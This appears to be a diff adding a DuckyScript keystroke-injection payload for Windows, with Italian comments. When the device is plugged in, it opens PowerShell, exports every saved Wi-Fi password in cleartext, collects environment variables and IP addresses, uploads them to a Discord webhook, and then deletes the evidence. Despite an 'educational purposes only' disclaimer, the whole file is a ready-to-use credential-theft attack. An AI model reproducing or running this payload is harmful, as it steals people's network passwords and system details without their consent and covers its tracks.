@@ -1,0 +1,21 @@
+REM Title:          WEBHOOK WIFI IP ENV
+REM By:             Achyon
+REM Target:         Windows 10/11 TESTED (CMD + Powershell)
+REM Discord URL:    INSERISCI IL LINK AL WEBHOOK DOVE RICHIESTO MANTENENDO IL VIRGOLETTATO
+REM Legal:          This script is for educational purposes only please do not use this for malicious purposes
+
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 500
+
+STRING $url="INSERISCI QUI LINK AL WEBHOOK DISCORD";dir env: >> wifi.txt;               cd C:\Users\$env:UserName\Desktop; netsh wlan export profile key=clear; Select-String -Path WiFi-* -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > wifi.txt ;netsh wlan export profile key=clear;Select-String -Path Wi-Fi-* -Pattern 'keyMaterial'> wifi.txt;$Body=@{ content = "$env:computername <---ho preso le password Wi-Fi <3"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@wifi.txt" $url ; Remove-Item '.\wifi.txt'
+ENTER
+DELAY 1000
+STRING $url="INSERISCI QUI LINK AL WEBHOOK DISCORD";dir env: >> stats.txt; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;$Body=@{ content = "$env:computername Altre cose potenzialmente utili:"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url ; Remove-Item '.\stats.txt'
+ENTER
+DELAY 400
+STRING cd C:\Users\$env:UserName\Desktop; Remove-Item Wi-Fi-*; Remove-Item wifi.txt; Remove-Item stats.txt;exit
+ENTER
